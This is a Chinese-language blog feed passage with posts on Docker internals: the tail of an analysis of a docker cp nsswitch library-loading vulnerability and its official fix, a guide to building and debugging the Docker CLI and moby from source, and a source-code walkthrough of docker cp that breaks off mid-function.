class="hljs-type">byte</span>)</span></span> syscall.Errno &#123;<br><span class="hljs-keyword">var</span> errno syscall.Errno<br>pwd, found, errno = _C_getpwuid_r(_C_uid_t(uid),<br>(*_C_char)(unsafe.Pointer(&amp;buf[<span class="hljs-number">0</span>])), _C_size_t(<span class="hljs-built_in">len</span>(buf)))<br><span class="hljs-keyword">return</span> errno<br>&#125;)<br>...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> _<span class="hljs-title">C_getpwuid_r</span><span class="hljs-params">(uid _C_uid_t, buf *_C_char, size _C_size_t)</span></span> (pwd _C_struct_passwd, found <span class="hljs-type">bool</span>, errno syscall.Errno) &#123;<br><span class="hljs-keyword">var</span> f, e _C_int<br>pwd = C.mygetpwuid_r(_C_int(uid), buf, size, &amp;f, &amp;e)<br><span class="hljs-keyword">return</span> pwd, f != <span class="hljs-number">0</span>, syscall.Errno(e)<br>&#125;<br></code></pre></td></tr></table></figure><p>可以发现，此时会调用到<code>_C_getpwuid_r</code>函数。而该函数又会调用到cgo中的<code>mygetpwuid_r</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> passwd <span class="hljs-title function_">mygetpwuid_r</span><span class="hljs-params">(<span class="hljs-type">int</span> uid, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buflen, <span class="hljs-type">int</span> *found, <span class="hljs-type">int</span> *perr)</span> &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> <span class="hljs-title">pwd</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">passwd</span> *<span class="hljs-title">result</span>;</span><br><span class="hljs-built_in">memset</span> (&amp;pwd, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(pwd));<br>*perr = getpwuid_r(uid, &amp;pwd, buf, buflen, &amp;result);<br>*found = result != <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> pwd;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中，使用了<code>getpwuid_r</code>函数。使用该函数需要加载nsswitch动态库，但此时已经通过relChroot函数chroot到了容器文件系统中，因此会从容器中动态加载nsswitch库。此时漏洞产生。<br>该漏洞出现过程中的函数调用链：<br><code>getContainersArchive</code>-&gt;<code>s.backend.ContainerArchivePath</code>-&gt;<code>...</code>-&gt;<code>invokerPack</code>-&gt;<code>tar</code>-&gt;<code>TarWithOptions</code>-&gt;<code>addTarFile</code>-&gt;<code>FileInfoHeader</code>-&gt;<code>tar.FileInfoHeader</code>-&gt;<code>statUnix</code>-&gt;<code>user.LookuoId</code>-&gt;<code>_C_getpwuid_r</code>-&gt;<code>C.mygetpwuid_r</code>-&gt;<code>getpwuid_r</code></p><h2 id="官方修复代码"><a href="#官方修复代码" class="headerlink" title="官方修复代码"></a>官方修复代码</h2><p>官方的修复代码的逻辑很简单，就是在chroot之前加载nsswitch动态库，这样就不会在不受信任的容器内部加载动态库了。<br><img src="/img/bVc8Yxo" alt="截屏2023-07-25 11.26.27.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker源码阅读，开发，调试环境搭建</title>
    <link href="/cll58powp0004kcutagaf7rbh/"/>
    <url>/cll58powp0004kcutagaf7rbh/</url>
    
    <content type="html"><![CDATA[<h1 id="docker源码阅读，开发，调试环境搭建"><a href="#docker源码阅读，开发，调试环境搭建" class="headerlink" title="docker源码阅读，开发，调试环境搭建"></a>docker源码阅读，开发，调试环境搭建</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>docker分为两部分，docker client 和docker engine。docker client就是我们日常使用的docker命令行工具，用户通过docker client指定参数向docker engine发送信息，docker engine接受到信息后做出实际的操作。目前这两部分的代码已经分离，其中docker client代码位于<a href="https://github.com/docker/cli,docker">https://github.com/docker/cli,docker</a> engine(更名为moby)代码位于<a href="https://github.com/moby/moby%E3%80%82%E7%94%B1%E4%BA%8E%E5%9C%A8%E7%BC%96%E8%AF%91%E6%97%B6%E4%BC%9A%E4%BD%BF%E7%94%A8%E5%88%B0docker%E5%92%8Cgo%EF%BC%8C%E6%89%80%E4%BB%A5%E9%9C%80%E8%A6%81%E9%A2%84%E5%85%88%E8%A3%85%E5%A5%BDdocker%E5%92%8Cgo">https://github.com/moby/moby。由于在编译时会使用到docker和go，所以需要预先装好docker和go</a></p><h2 id="docker-client"><a href="#docker-client" class="headerlink" title="docker client"></a>docker client</h2><p>首先下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/docker/cli.git<br></code></pre></td></tr></table></figure><p>之后将下载好的源码放到$GOPATH&#x2F;src&#x2F;github.com&#x2F;docker下<br><img src="/img/bVc8ZNO" alt="截屏2023-07-26 15.22.09.png"><br>进入到cli目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -f docker.Makefile binary<br></code></pre></td></tr></table></figure><p>顺利执行完毕后会在当前目录下的build下发现编译好的docker，此时docker client编译完成。当我们想要做出更改的时候，修改完代码再执行一次上面的make命令即可重新编译成功。<br>需要注意的是，如果我们想用dlv或者gdb对编译好的可执行文件进行调试就需要再编译时保留调试信息，但是默认情况下编译出来的可执行文件是不包含调试信息的，我们需要在&#x2F;scripts&#x2F;build&#x2F;.variables下将GO_LDFLAGS的”-w”删除掉。<br><img src="/img/bVc8ZPn" alt="截屏2023-07-26 15.34.17.png"></p><h2 id="moby"><a href="#moby" class="headerlink" title="moby"></a>moby</h2><p>同样，首先下载源码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/moby/moby.git<br></code></pre></td></tr></table></figure><p>之后将下载好的源码放到$GOPATH&#x2F;src&#x2F;github.com&#x2F;docker下，并将其重命名为docker<br><img src="/img/bVc8ZNO" alt="截屏2023-07-26 15.22.09.png"><br>进入到docker目录下执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">make binary   （静态编译）<br>make dynbinary (动态编译)<br></code></pre></td></tr></table></figure><p>顺利执行完毕后会在当前目录下的bundles&#x2F;binary下发现dockerd可执行文件（如果是动态编译的话可执行文件会存放在bundles&#x2F;dynbinary下）<br>同样，如果我们想要使用dlv或者gdb等对dockerd进行调试，那我们就需要保留调试信息。在hack&#x2F;make.sh中将LDFLAGS的“-w”去掉<br><img src="/img/bVc8ZPf" alt="截屏2023-07-26 15.33.55.png"></p><h2 id="联动"><a href="#联动" class="headerlink" title="联动"></a>联动</h2><p>至此docker client和moby的编译工作已经完成，下一步是需要让编译好的docker client使用编译好的moby作为docker daemon。此时我们需要先将原有的docker停止</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl stop docker<br>systemctl stop docker.socket<br></code></pre></td></tr></table></figure><p>之后先进入GOPATH&#x2F;src&#x2F;github.com&#x2F;docker&#x2F;docker&#x2F;bundles&#x2F;binary下启动dockerd</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./dockerd<br></code></pre></td></tr></table></figure><p>此时使用$GOPATH&#x2F;src&#x2F;github.com&#x2F;docker&#x2F;cli&#x2F;build下的docker client时，它会自动将请求发送到自行编译的moby上。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker cp源码分析</title>
    <link href="/cll58powr0006kcut7e1t8qv6/"/>
    <url>/cll58powr0006kcut7e1t8qv6/</url>
    
    <content type="html"><![CDATA[<h1 id="docker-cp源码分析"><a href="#docker-cp源码分析" class="headerlink" title="docker cp源码分析"></a>docker cp源码分析</h1><p>最近在分析docker的几个cve的时候发现好多都与docker cp命令有关，故此从代码层面分析一下docker cp的实现流程</p><h2 id="docker-cp简介"><a href="#docker-cp简介" class="headerlink" title="docker cp简介"></a>docker cp简介</h2><p>docker cp命令用于宿主机和容器之间的文件传输。数据流向有两种，从容器到宿主机和从宿主机到容器，目前不支持从容器到容器的复制。命令格式为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker cp hostfile containerID:containerFile #从宿主机向容器复制文件<br>docker cp containerID:containerFile hostFile #从容器向宿主机复制文件<br></code></pre></td></tr></table></figure><h2 id="docker-client源码分析"><a href="#docker-client源码分析" class="headerlink" title="docker client源码分析"></a>docker client源码分析</h2><p>当用户执行docker cp命令后会首先进入runCopy函数（&#x2F;cli&#x2F;command&#x2F;container&#x2F;cp.go）</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runCopy</span><span class="hljs-params">(dockerCli command.Cli, opts copyOptions)</span></span> <span class="hljs-type">error</span> &#123;<br>srcContainer, srcPath := splitCpArg(opts.source)<br>destContainer, destPath := splitCpArg(opts.destination)<br>...<br><span class="hljs-keyword">var</span> direction copyDirection<br><span class="hljs-keyword">if</span> srcContainer != <span class="hljs-string">&quot;&quot;</span> &#123;<br>direction |= fromContainer<br>copyConfig.container = srcContainer<br>&#125;<br><span class="hljs-keyword">if</span> destContainer != <span class="hljs-string">&quot;&quot;</span> &#123;<br>direction |= toContainer<br>copyConfig.container = destContainer<br>&#125;<br>    ...<br><span class="hljs-keyword">switch</span> direction &#123;<br><span class="hljs-keyword">case</span> fromContainer:<br><span class="hljs-keyword">return</span> copyFromContainer(ctx, dockerCli, copyConfig)<br><span class="hljs-keyword">case</span> toContainer:<br><span class="hljs-keyword">return</span> copyToContainer(ctx, dockerCli, copyConfig)<br><span class="hljs-keyword">case</span> acrossContainers:<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;copying between containers is not supported&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> errors.New(<span class="hljs-string">&quot;must specify at least one container source&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>runCopy函数首先对用户输入的参数进行解析，判断是从宿主机向容器复制文件还是从容器向宿主机复制文件。根据文件流向的不同调用不同的函数。</p><h3 id="copyFromContainer"><a href="#copyFromContainer" class="headerlink" title="copyFromContainer"></a>copyFromContainer</h3><p>当用户执行docker cp containerid:containerFile hostFile命令时会进入copyFromContainer函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyFromContainer</span><span class="hljs-params">(ctx context.Context, dockerCli command.Cli, copyConfig cpConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br>client := dockerCli.Client()<br><span class="hljs-comment">// if client requests to follow symbol link, then must decide target file to be copied</span><br><span class="hljs-keyword">var</span> rebaseName <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> copyConfig.followLink &#123;<br>srcStat, err := client.ContainerStatPath(ctx, copyConfig.container, srcPath)<br><br><span class="hljs-comment">// If the destination is a symbolic link, we should follow it.</span><br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; srcStat.Mode&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>linkTarget := srcStat.LinkTarget<br><span class="hljs-keyword">if</span> !system.IsAbs(linkTarget) &#123;<br><span class="hljs-comment">// Join with the parent directory.</span><br>srcParent, _ := archive.SplitPathDirEntry(srcPath)<br>linkTarget = filepath.Join(srcParent, linkTarget)<br>&#125;<br><br>linkTarget, rebaseName = archive.GetRebaseName(srcPath, linkTarget)<br>srcPath = linkTarget<br>&#125;<br><br>&#125;<br>    ...<br>content, stat, err := client.CopyFromContainer(ctx, copyConfig.container, srcPath)<br>...<br>preArchive := content<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(srcInfo.RebaseName) != <span class="hljs-number">0</span> &#123;<br>_, srcBase := archive.SplitPathDirEntry(srcInfo.Path)<br>preArchive = archive.RebaseArchiveEntries(content, srcBase, srcInfo.RebaseName)<br>&#125;<br>...<br>res := archive.CopyTo(preArchive, srcInfo, dstPath)<br>...<br><span class="hljs-keyword">return</span> res<br>&#125;<br></code></pre></td></tr></table></figure><p>如果设置了followLink，copyFromContainer函数会先调用client.ContainerStatPath函数向docker daemon的<code>HEAD /containers/(containerID)/archive</code>接口发送文件路径信息和容器信息来获得srcPath的链接target，并将srcPath(也就时容器中的文件位置)设置为链接的目标文件,同时设置rebasename表示源文件路径需要调整。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cli *Client)</span></span> ContainerStatPath(ctx context.Context, containerID, path <span class="hljs-type">string</span>) (types.ContainerPathStat, <span class="hljs-type">error</span>) &#123;<br>    ...<br>urlStr := <span class="hljs-string">&quot;/containers/&quot;</span> + containerID + <span class="hljs-string">&quot;/archive&quot;</span><br>response, err := cli.head(ctx, urlStr, query, <span class="hljs-literal">nil</span>)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>之后调用client.CopyFromContainer函数将srcPath以及container的信息发送给docker daemon的<code>GET /containers/(containerID)/archive</code>接口。docker daemon的该接口会根据path和container信息将需要复制的文件进行打包，并以response的形式返回给docker client</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cli *Client)</span></span> CopyFromContainer(ctx context.Context, containerID, srcPath <span class="hljs-type">string</span>) (io.ReadCloser, types.ContainerPathStat, <span class="hljs-type">error</span>) &#123;<br>...<br>apiPath := <span class="hljs-string">&quot;/containers/&quot;</span> + containerID + <span class="hljs-string">&quot;/archive&quot;</span><br>response, err := cli.get(ctx, apiPath, query, <span class="hljs-literal">nil</span>)<br>...<br><span class="hljs-keyword">return</span> response.body, stat, err<br>&#125;<br></code></pre></td></tr></table></figure><p>接收到response中的文件信息后docker client会使用CopyTo函数将response中的文件移动到dstpath位置。在此之前，如果源文件的路径需要重新调整（rebaseName 不为空），则使用 archive.RebaseArchiveEntries 函数调整文件内容中的条目路径。<br>总体而言 copyFromContainer的执行流程大致如下图所示，其中红色标识的函数为client向daemon发送请求，其实际的执行逻辑由daemon进行：<br><img src="/img/bVc80SK" alt="未命名文件-9.png"></p><h3 id="copyToContainer"><a href="#copyToContainer" class="headerlink" title="copyToContainer"></a>copyToContainer</h3><p>当用户执行docker cp hostFile containerid:containerFile 命令时会进入copyToContainer函数。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">copyToContainer</span><span class="hljs-params">(ctx context.Context, dockerCli command.Cli, copyConfig cpConfig)</span></span> (err <span class="hljs-type">error</span>) &#123;<br>...<br>client := dockerCli.Client()<br> ...<br>dstStat, err := client.ContainerStatPath(ctx, copyConfig.container, dstPath)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &amp;&amp; dstStat.Mode&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>linkTarget := dstStat.LinkTarget<br><span class="hljs-keyword">if</span> !system.IsAbs(linkTarget) &#123;<br>dstParent, _ := archive.SplitPathDirEntry(dstPath)<br>linkTarget = filepath.Join(dstParent, linkTarget)<br>&#125;<br>dstInfo.Path = linkTarget<br>dstStat, err = client.ContainerStatPath(ctx, copyConfig.container, linkTarget)<br>&#125;<br>...<br><span class="hljs-keyword">if</span> srcPath == <span class="hljs-string">&quot;-&quot;</span> &#123;<br>content = os.Stdin<br>resolvedDstPath = dstInfo.Path<br><span class="hljs-keyword">if</span> !dstInfo.IsDir &#123;<br><span class="hljs-keyword">return</span> errors.Errorf(<span class="hljs-string">&quot;destination \&quot;%s:%s\&quot; must be a directory&quot;</span>, copyConfig.container, dstPath)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>srcInfo, err := archive.CopyInfoSourcePath(srcPath, copyConfig.followLink)<br>...<br>srcArchive, err := archive.TarResource(srcInfo)<br>...<br>dstDir, preparedArchive, err := archive.PrepareArchiveCopy(srcArchive, srcInfo, dstInfo)<br>...<br>resolvedDstPath = dstDir<br>content = preparedArchive<br>...<br>&#125;<br>...<br>res := client.CopyToContainer(ctx, copyConfig.container, resolvedDstPath, content, options)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>和copyFromContainer类似，copyToContainer首先会对dstPath也就是容器内的目标地址进行评估，通过client.ContainerStatPath函数向docker daemon发送请求获取文件信息。如果目标路径是一个链接的话则对于链接的目标地址继续使用client.ContainerStatPath获取信息。<br>在获取到目标地址的信息后，copyToContainer函数使用archive.TarResource函数对宿主机的文件进行打包。最后通过client.CopyToContainer函数将打包后的文件，容器信息，目标地址信息发送给docker daemon的<code>PUT /containers/(containerID)/archive</code>接口。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(cli *Client)</span></span> CopyToContainer(ctx context.Context, containerID, dstPath <span class="hljs-type">string</span>, content io.Reader, options types.CopyToContainerOptions) <span class="hljs-type">error</span> &#123;<br>...<br>apiPath := <span class="hljs-string">&quot;/containers/&quot;</span> + containerID + <span class="hljs-string">&quot;/archive&quot;</span><br>response, err := cli.putRaw(ctx, apiPath, query, content, <span class="hljs-literal">nil</span>)<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>docker daemon接受到此信息后将request中的打包后的文件复制到容器内部。总体而言 copyToContainer的执行流程大致如下图所示，其中红色标识的函数为client向daemon发送请求，其实际的执行逻辑由daemon进行：<br><img src="/img/bVc80S9" alt="未命名文件-10.png"></p><h3 id="docker-client总结"><a href="#docker-client总结" class="headerlink" title="docker client总结"></a>docker client总结</h3><p>通过上述分析可以发现，copyFromContainer和copyToContainer函数的处理逻辑是很相似的，只是打包文件的流向发生了变化，copyFromContainer是<code>docker daemon-&gt;docker client。copyToContainer</code>是<code>docker client-&gt;docker daemon</code>。也就是说docker cp中关于宿主机的文件操作（打包，解包）都是在docker client处进行的，关于容器的文件操作（打包，解包，获取文件信息）都是在docker daemon处进行的。</p><h2 id="docker-daemon-源码分析"><a href="#docker-daemon-源码分析" class="headerlink" title="docker daemon 源码分析"></a>docker daemon 源码分析</h2><p>在moby的 api&#x2F;server&#x2F;router&#x2F;container&#x2F;container.go中定义了如下接口：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(r *containerRouter)</span></span> initRoutes() &#123;<br>...<br>router.NewHeadRoute(<span class="hljs-string">&quot;/containers/&#123;name:.*&#125;/archive&quot;</span>, r.headContainersArchive),<br>router.NewGetRoute(<span class="hljs-string">&quot;/containers/&#123;name:.*&#125;/archive&quot;</span>, r.getContainersArchive),<br>router.NewPutRoute(<span class="hljs-string">&quot;/containers/&#123;name:.*&#125;/archive&quot;</span>, r.putContainersArchive),<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>这些接口是对外提供给docker client的。通过上面的docker client源码分析我们可以了解到，第一个接口是用来获取容器内部文件信息的，第二个接口使用来从docker daemon向docker client发送打包文件的，第三个接口是用来从docker client向docker daemon发送打包文件的。下面对这些接口的函数做详细分析</p><h3 id="headContainersArchive"><a href="#headContainersArchive" class="headerlink" title="headContainersArchive"></a>headContainersArchive</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> headContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br>...<br>stat, err := s.backend.ContainerStatPath(v.Name, v.Path)<br>...<br><span class="hljs-keyword">return</span> setContainerPathStatHeader(stat, w.Header())<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> ContainerStatPath(name <span class="hljs-type">string</span>, path <span class="hljs-type">string</span>) (stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>ctr, err := daemon.GetContainer(name)<br>...<br>stat, err = daemon.containerStatPath(ctr, path)<br>...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> containerStatPath(container *container.Container, path <span class="hljs-type">string</span>) (stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>...<br>cfs, err := daemon.openContainerFS(container)<br>...<br><span class="hljs-keyword">return</span> cfs.Stat(context.TODO(), path)<br>&#125;<br></code></pre></td></tr></table></figure><p>headContainersArchive函数通过s.backend.ContainerStatPath调用到daemon.containerStatPath函数。daemon.containerStatPath函数首先打开对应容器的文件系统，并调用该文件系统的Stat函数获取文件信息。</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(vw *containerFSView)</span></span> Stat(ctx context.Context, path <span class="hljs-type">string</span>) (*types.ContainerPathStat, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> stat *types.ContainerPathStat<br>err := vw.RunInFS(ctx, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">error</span> &#123;<br>lstat, err := os.Lstat(path)<br>...<br><span class="hljs-keyword">var</span> target <span class="hljs-type">string</span><br><span class="hljs-keyword">if</span> lstat.Mode()&amp;os.ModeSymlink != <span class="hljs-number">0</span> &#123;<br>target, err = symlink.FollowSymlinkInScope(path, <span class="hljs-string">&quot;/&quot;</span>)<br>...<br>&#125;<br>stat = &amp;types.ContainerPathStat&#123;<br>Name:       filepath.Base(path),<br>Size:       lstat.Size(),<br>Mode:       lstat.Mode(),<br>Mtime:      lstat.ModTime(),<br>LinkTarget: target,<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;)<br><span class="hljs-keyword">return</span> stat, err<br>&#125;<br></code></pre></td></tr></table></figure><p>在Stat函数中，首先使用vw.RunInFS限定当前在容器的上下文环境中执行。关于文件的操作，首先使用os.Lstat获取对应文件的FileInfo信息，之后判断该文件是否为链接文件，如果是则使用FollowSymlinkInScope函数获取此链接文件的信息</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">FollowSymlinkInScope</span><span class="hljs-params">(path, root <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">error</span>) &#123;<br>path, err := filepath.Abs(filepath.FromSlash(path))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br>root, err = filepath.Abs(filepath.FromSlash(root))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> evalSymlinksInScope(path, root)<br>&#125;<br></code></pre></td></tr></table></figure><p>FollowSymlinkInScope实际上是调用evalSymlinksInScope进行实际的处理逻辑的，evalSymlinksInScope 将在调用时对作用域 <code>root</code> 中 <code>path</code> 的符号链接进行评估，并返回保证包含在作用域 <code>root</code> 中的结果。例如：&#x2F;foo&#x2F;bar链接指向&#x2F;outside，那么evalSymlinksInScope（“&#x2F;foo&#x2F;bar”，“&#x2F;foo”）会返回&#x2F;foo&#x2F;outside。</p><h3 id="getContainersArchive"><a href="#getContainersArchive" class="headerlink" title="getContainersArchive"></a>getContainersArchive</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *containerRouter)</span></span> getContainersArchive(ctx context.Context, w http.ResponseWriter, r *http.Request, vars <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-type">error</span> &#123;<br>v, err := httputils.ArchiveFormValues(r, vars)<br>...<br>tarArchive, stat, err := s.backend.ContainerArchivePath(v.Name, v.Path)<br>...<br><span class="hljs-keyword">return</span> writeCompressedResponse(w, r, tarArchive)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(daemon *Daemon)</span></span> ContainerArchivePath(name <span class="hljs-type">string</span>, path <span class="hljs-type">string</span>) (content io.ReadCloser, stat *types.ContainerPathStat, err <span class="hljs-type">error</span>) &#123;<br>ctr, err := 